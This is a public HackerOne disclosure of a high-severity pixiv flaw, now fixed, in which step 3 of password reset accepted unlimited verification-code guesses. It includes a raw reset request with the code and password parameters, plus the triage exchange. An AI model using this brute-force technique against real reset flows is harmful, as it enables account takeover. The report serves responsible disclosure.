---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/weak-password-recovery-mechanism-for-forgotten-password
  - env/web
substate: "resolved"
weakness: "Weak Password Recovery Mechanism for Forgotten Password"
enriched: true
date: 2021-03-31
submitted: 2019-09-29T21:45:27.602Z
bounty_usd: null
votes: 313
cve: []
program: "[[programs/pixiv|pixiv]]"
reporter: "noxxxx"
source: "https://hackerone.com/reports/703972"
title: "Reset any password"
---
# Reset any password

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 313 | **Program:** pixiv | **Disclosed:** 2021-03-31

- Report: [https://hackerone.com/reports/703972](https://hackerone.com/reports/703972)
- CWE: Weak Password Recovery Mechanism for Forgotten Password
- Submitted: 2019-09-29T21:45:27.602Z

## Timeline

- **Report Filed**
- **2019-09-30** @nochnoidozor: Hi @noxx,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **2019-10-01** @kobo: Hi @noxx,

Thanks for reporting.
I took a look at your report, and have tested on my own to see if I can reproduce this. However, I was uncertain of a few things.

> input the email verification code and try to guess the verification code, but I won’t be able to continue using it after I try it a few times.

We have a limit to the number of attempts for the authentication_code, and once the limit is reached, the authentication_code will be revoked.

> After trying, I found that there was no such submission restriction when the password was reset in the third step.

What do you mean by this? What did you do that enabled you to submit without restrictions?
- **2019-10-01** @noxxxx: Yes, there is a limit on the number of authentication_codes in the second step of password reset.

This is the request message for the reset password. You can see the new_password_1 and authentication_code parameters in this request:
```http
POST /reset_pass.php?code_id=9483983&code=6d02e9f496e38173c3663e45e80745b0 HTTP/1.1
Host: www.pixiv.net
Connection: close
Content-Length: 167
Cache-Control: max-age=0
Origin: https://www.pixiv.net
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Sec-Fetch-Site: same-origin
Referer: https://www.pixiv.net/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: first_visit_datetime_pc=2019-10-01+20%3A07%3A27; p_ab_id=3; p_ab_id_2=2; p_ab_d_id=1227808330; _ga=GA1.2.1703015906.1569928121; _gid=GA1.2.634922121.1569928121; device_token=168838d396f304fa55c9b66476eefe9d; c_type=10; a_type=0; b_type=0; privacy_policy_agreement=0; login_ever=yes; yuid_b=NSB2kYU; __utma=235335808.1703015906.1569928121.1569928203.1569928203.1; __utmc=235335808; __utmz=235335808.1569928203.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmv=235335808.|2=login%20ever=yes=1^3=plan=normal=1^6=user_id=44289328=1^9=p_ab_id=3=1^10=p_ab_id_2=2=1^11=lang=zh=1; __utmt=1; PHPSESSID=c82f44b74d511c4e04111a2b7477c25d; login_bc=1; __utmb=235335808.7.9.1569928313839

tt=b7296b8d2e8f5bcfa4d749e07ec4a052&mode=reset&authentication_code=708718&new_password_1=123123aaa&new_password_2=123123aaa&submit=%E3%80%80%E5%8F%91%E9%80%81%E3%80%80
```
There is no limit to the number of authentication_code parameters in this request. With this request, the verification code can be submitted all the time.
- **2019-10-01** @noxxxx: There are three steps to reset the password.
{F596459}
In the step 2 , there have limit to the number of attempts for the authentication_codes, but there is no such restriction in step 3. (Because step 3 also contains the authentication code parameter).

step 2 can be ignored, so we can submit the authentication_codes indefinitely in step 3.
{F596470}
- **Report Triaged**
- **2019-10-03** @kobo: @noxx We have deployed a fix for this issue. Could you take a look and see if the issue has been resolved?
Thanks,
- **2019-10-03** @noxxxx: @kobo I've verified the fix
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
